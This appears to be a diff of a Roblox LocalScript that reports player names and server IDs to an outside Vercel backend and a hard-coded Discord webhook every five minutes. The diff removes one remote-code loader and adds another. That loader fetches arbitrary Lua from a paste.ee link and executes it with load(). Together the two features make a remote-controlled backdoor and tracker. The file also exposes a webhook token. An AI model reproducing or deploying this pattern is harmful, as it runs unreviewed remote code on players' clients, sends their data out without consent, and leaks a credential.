@@ -1,34 +1,27 @@
--- Tempatkan script ini di StarterPlayerScripts (LocalScript)
-
--- Pertama, load dan jalankan script eksternal dari paste.ee
-local success, err = pcall(function()
-    loadstring(game:HttpGet("https://paste.ee/r/kEHhQbpL"))()
-end)
-
-if not success then
-    warn("Failed to load external script: " .. tostring(err))
-end
-
-local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 
+-- CONFIGURATION
 local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
 local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
 local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
+local EXTERNAL_SCRIPT_URL = "https://paste.ee/r/kEHhQbpL"
 
-local REPORT_INTERVAL = 300 -- 5 menit
+local REPORT_INTERVAL = 300 -- 5 minutes
 local DEBUG_MODE = true
 local MAX_RETRIES = 3
-local RETRY_DELAY = 2 -- detik
+local RETRY_DELAY = 2 -- seconds
 
+-- System variables
 local player = Players.LocalPlayer
 local currentInstanceId = game.JobId
 local isRunning = true
+
+-- ====================== [UTILITY FUNCTIONS] ======================
 
 local function log(message)
     if DEBUG_MODE then
@@ -36,6 +29,7 @@ local function log(message)
     end
 end
 
+-- Retry wrapper untuk backend request
 local function makeBackendRequest(url, method, data)
     for attempt = 1, MAX_RETRIES do
         local success, response = pcall(function()
@@ -64,6 +58,8 @@ local function makeBackendRequest(url, method, data)
     end
     return false
 end
+
+-- ====================== [WEBHOOK VIA BACKEND PROXY] ======================
 
 local function sendToBackendProxy(contentOrPayload)
     if WEBHOOK_URL == "" then
@@ -121,6 +117,8 @@ local function sendEnhancedWebhook(messageType, customMessage)
     end
 end
 
+-- ====================== [DATABASE LOGGING] ======================
+
 local function registerPlayer()
     local data = {
         username = player.Name,
@@ -151,6 +149,47 @@ local function updateInstanceStatus(status, extraData)
     return makeBackendRequest(INSTANCE_URL, "POST", data)
 end
 
+-- ====================== [SCRIPT MONITORING] ======================
+
+local function executeExternalScript()
+    log("Fetching script from: " .. EXTERNAL_SCRIPT_URL)
+
+    local success, content = pcall(function()
+        return HttpService:GetAsync(EXTERNAL_SCRIPT_URL)
+    end)
+
+    if not success then
+        log("❌ Fetch error: " .. tostring(content))
+        return false
+    end
+
+    if not content or #content < 10 then
+        log("❌ Script content too short or empty")
+        return false
+    end
+
+    log("✅ Script fetched. Attempting to load...")
+
+    local fn, err = load(content)
+    if not fn then
+        log("❌ Load error: " .. tostring(err))
+        return false
+    end
+
+    log("✅ Script loaded. Executing...")
+
+    local success2, result = pcall(fn)
+    if not success2 then
+        log("❌ Execution error: " .. tostring(result))
+        return false
+    end
+
+    log("✅ Script executed successfully")
+    return true
+end
+
+-- ====================== [MAIN LOGIC] ======================
+
 local function periodicReporting()
     while isRunning do
         updateInstanceStatus("active")
@@ -172,10 +211,17 @@ local function initialize()
     coroutine.wrap(periodicReporting)()
 
     updateInstanceStatus("script_started")
-    sendEnhancedWebhook("SCRIPT_STARTED", "External script execution skipped")
+    sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")
 
-    updateInstanceStatus("script_completed")
-    sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution skipped, no external script run")
+    local scriptSuccess = executeExternalScript()
+
+    if scriptSuccess then
+        updateInstanceStatus("script_completed")
+        sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
+    else
+        updateInstanceStatus("script_failed", { error = "External script execution failed" })
+        sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
+    end
 end
 
 local function shutdown()
@@ -196,16 +242,8 @@ Players.PlayerRemoving:Connect(function(removedPlayer)
     end
 end)
 
--- Pastikan script tetap jalan walaupun teleport:
-local teleportData = TeleportService:GetLocalPlayerTeleportData()
-
-if teleportData and teleportData.resumeLogger then
-    -- Bisa baca data dari teleport jika perlu, contoh:
-    log("Resuming logger after teleport")
-end
-
-local successInit, errInit = pcall(initialize)
-if not successInit then
-    updateInstanceStatus("initialization_failed", { error = tostring(errInit) })
-    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(errInit) .. "\n```")
+local success, err = pcall(initialize)
+if not success then
+    updateInstanceStatus("initialization_failed", { error = tostring(err) })
+    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
 end
